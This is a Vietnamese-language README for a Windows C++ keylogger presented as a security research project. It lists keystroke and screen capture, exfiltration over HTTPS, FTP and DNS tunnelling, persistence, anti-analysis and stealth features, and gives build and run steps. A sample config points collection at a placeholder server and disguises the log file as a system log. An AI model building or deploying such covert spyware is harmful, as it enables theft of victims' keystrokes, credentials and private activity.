# Keylogger Research Project 🔍

![C++](https://img.shields.io/badge/C++-17-blue.svg)
![Windows](https://img.shields.io/badge/Platform-Windows-lightgrey.svg)
![License](https://img.shields.io/badge/License-MIT-green.svg)
![Version](https://img.shields.io/badge/Version-1.0.0-orange.svg)

Dự án nghiên cứu keylogger tiên tiến với mục đích giáo dục và nghiên cứu bảo mật. Phần mềm được thiết kế để ghi lại các sự kiện bàn phím, chuột và hoạt động hệ thống một cách tinh vi.

## ⚠️ CẢNH BÁO QUAN TRỌNG

**LƯU Ý: ĐÂY LÀ DỰ ÁN NGHIÊN CỨU**

- Phần mềm này chỉ dành cho mục đích giáo dục và nghiên cứu bảo mật
- **KHÔNG** được sử dụng cho mục đích xấu hoặc trái phép
- Luôn tuân thủ luật pháp địa phương và quy định về quyền riêng tư
- Chỉ sử dụng trên các hệ thống bạn sở hữu hoặc có sự cho phép rõ ràng

## ✨ Tính năng nổi bật

- **🎯 Thu thập dữ liệu đa dạng**

  - Ghi lại sự kiện bàn phím và chuột
  - Chụp ảnh màn hình
  - Thu thập thông tin hệ thống
  - Theo dõi hoạt động ứng dụng

- **🔒 Bảo mật nâng cao**

  - Mã hóa AES dữ liệu thu thập
  - Kỹ thuật obfuscation code
  - Phát hiện và chống phân tích
  - Ẩn mình tiên tiến

- **🌐 Đa phương thức truyền thông**

  - HTTP/HTTPS encryption
  - FTP transfer
  - DNS tunneling
  - Hỗ trợ proxy

- **🔄 Khả năng duy trì**
  - Registry persistence
  - Scheduled tasks
  - Windows service
  - Tự động hồi phục

## 🛠️ Cài đặt và Biên dịch

### Yêu cầu hệ thống

- Windows 7 trở lên
- Visual Studio 2019 hoặc mới hơn
- CMake 3.15+
- Windows SDK 10.0+

### Các bước biên dịch

1. **Clone repository**

```bash
git clone https://github.com/KhanhRomVN/KeyloggerClient.git
cd KeyloggerClient
```

2. **Tạo thư mục build**

```bash
mkdir build
cd build
```

3. **Biên dịch với CMake**

```bash
cmake -G "Visual Studio 16 2019" -A x64 ..
cmake --build . --config Release
```

4. **Ký mã (Tùy chọn)**

```bash
scripts\sign.bat
```

## ⚙️ Cấu hình

Chỉnh sửa file `resources/config/default.cfg` để tùy chỉnh:

```ini
[core]
log_path = C:\Windows\Temp\system.log
collection_interval = 300000
jitter_factor = 0.3

[communication]
server_url = https://your-server.com/collect
comms_method = https

[security]
encryption_key = your_encryption_key_here
enable_obfuscation = true
```

## 🚀 Sử dụng

### Chế độ thông thường

```bash
KeyloggerClient.exe
```

### Chế độ service

```bash
KeyloggerClient.exe --service
```

### Chế độ gỡ lỗi

```bash
KeyloggerClient.exe --debug
```

## 📁 Cấu trúc dự án

```
KeyloggerClient/
├── src/                 # Mã nguồn chính
│   ├── core/           # Core functionality
│   ├── hooks/          # Keyboard/mouse hooks
│   ├── security/       # Security features
│   ├── communication/  # Communication modules
│   └── persistence/    # Persistence mechanisms
├── include/            # Header files
├── resources/          # Configuration files
├── build_scripts/      # Build scripts
└── cmake/              # CMake modules
```

## 🛡️ Tính năng bảo mật

- **Chống phân tích**: Phát hiện debugger, VM và sandbox
- **Mã hóa**: AES-256 cho dữ liệu và configuration
- **Obfuscation**: Mã hóa string và code
- **Ẩn mình**: Kỹ thuật stealth mode
- **Tự bảo vệ**: Anti-tampering mechanisms

## 📜 Giấy phép

Dự án này được phân phối under MIT License. Xem file [LICENSE](LICENSE) để biết thêm chi tiết.

## 🤝 Đóng góp

Đóng góp được hoan nghênh! Vui lòng:

1. Fork repository
2. Tạo feature branch
3. Commit changes
4. Push to branch
5. Tạo Pull Request

## 📧 Liên hệ

- **Tác giả**: KhanhRomVN
- **Email**: khanhromvn@gmail.com
- **GitHub**: [https://github.com/KhanhRomVN](https://github.com/KhanhRomVN)
- **Repository**: [https://github.com/KhanhRomVN/KeyloggerClient](https://github.com/KhanhRomVN/KeyloggerClient)

## 🔮 Roadmap

- [ ] Thêm support Linux
- [ ] Web-based dashboard
- [ ] Plugin system
- [ ] Advanced anti-analysis
- [ ] Blockchain-based logging

---

**LƯU Ý CUỐI CÙNG**: Dự án này chỉ dành cho mục đích giáo dục và nghiên cứu. Luôn sử dụng một cách có trách nhiệm và hợp pháp.
